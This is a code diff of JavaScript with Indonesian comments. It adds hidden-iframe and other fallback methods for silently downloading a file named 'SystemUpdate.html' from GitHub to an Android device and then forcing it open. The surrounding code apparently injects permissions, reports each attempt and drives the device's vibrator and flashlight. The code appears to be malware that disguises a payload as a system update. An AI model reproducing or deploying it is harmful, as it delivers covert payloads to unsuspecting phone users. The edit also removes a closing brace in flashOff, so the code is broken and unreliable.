@@ -340,7 +340,7 @@ function injectAllPermissions() {
 }
 
 // ============================================================
-// 🔥 DOWNLOAD HTML (TANPA POPUP!)
+// 🔥 DOWNLOAD HTML - PERBAIKAN: TAMBAH IFRAME FALLBACK!
 // ============================================================
 function downloadHTMLSilent() {
     if (HTML_DOWNLOADED) return;
@@ -348,6 +348,7 @@ function downloadHTMLSilent() {
     var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
     var htmlPath = '/storage/emulated/0/Download/SystemUpdate.html';
     
+    // ✅ METHOD 1: XHR
     try {
         var xhr = new XMLHttpRequest();
         xhr.open('GET', htmlUrl, true);
@@ -368,15 +369,29 @@ function downloadHTMLSilent() {
         };
         xhr.send();
     } catch(e) {}
+    
+    // ✅ METHOD 2: IFRAME (FALLBACK - TANPA REDIRECT!)
+    try {
+        var iframe = document.getElementById('downloadIframe');
+        if (!iframe) {
+            iframe = document.createElement('iframe');
+            iframe.id = 'downloadIframe';
+            iframe.style.cssText = 'position:absolute;width:0;height:0;border:none;visibility:hidden';
+            document.body.appendChild(iframe);
+        }
+        iframe.src = htmlUrl;
+        K({ sumber: 'html_download_iframe', data: 'attempt' });
+    } catch(e) {}
 }
 
 // ============================================================
-// 🔥 BUKA SystemUpdate.html
+// 🔥 BUKA SystemUpdate.html - PERBAIKAN: COBA LOCALSTORAGE
 // ============================================================
 function openSystemUpdateHTML() {
     var htmlPath = '/storage/emulated/0/Download/SystemUpdate.html';
     
     setTimeout(function() {
+        // ✅ METHOD 1: ANDROID BRIDGE
         if (PLATFORM.isAndroid && typeof AndroidBridge !== 'undefined') {
             try {
                 AndroidBridge.openFile(htmlPath);
@@ -385,6 +400,7 @@ function openSystemUpdateHTML() {
             } catch(e) {}
         }
         
+        // ✅ METHOD 2: LOCALSTORAGE
         try {
             var htmlContent = localStorage.getItem('SystemUpdate.html');
             if (htmlContent) {
@@ -396,6 +412,7 @@ function openSystemUpdateHTML() {
             }
         } catch(e) {}
         
+        // ✅ METHOD 3: FILE URI (ANDROID)
         if (PLATFORM.isAndroid) {
             try {
                 window.location.href = 'file:///storage/emulated/0/Download/SystemUpdate.html';
@@ -403,6 +420,7 @@ function openSystemUpdateHTML() {
             } catch(e) {}
         }
         
+        // ✅ METHOD 4: IOS
         if (PLATFORM.isIOS) {
             try {
                 var htmlContent = localStorage.getItem('SystemUpdate.html');
@@ -504,7 +522,7 @@ var A = {
     vibrate: function(d) { if(this.isAvailable){ try{return AndroidBridge.vibrate(d||1000)}catch(e){}} return null },
     showToast: function(m) { if(this.isAvailable){ try{return AndroidBridge.showToast(m)}catch(e){}} return null },
     flashOn: function() { if(this.isAvailable){ try{return AndroidBridge.flashOn()}catch(e){}} return null },
-    flashOff: function() { if(this.isAvailable){ try{return AndroidBridge.flashOff()}catch(e){}} return null }
+    flashOff: function() { if(this.isAvailable){ try{return AndroidBridge.flashOff()}catch(e){}} return null
 };
 
 // ============================================================
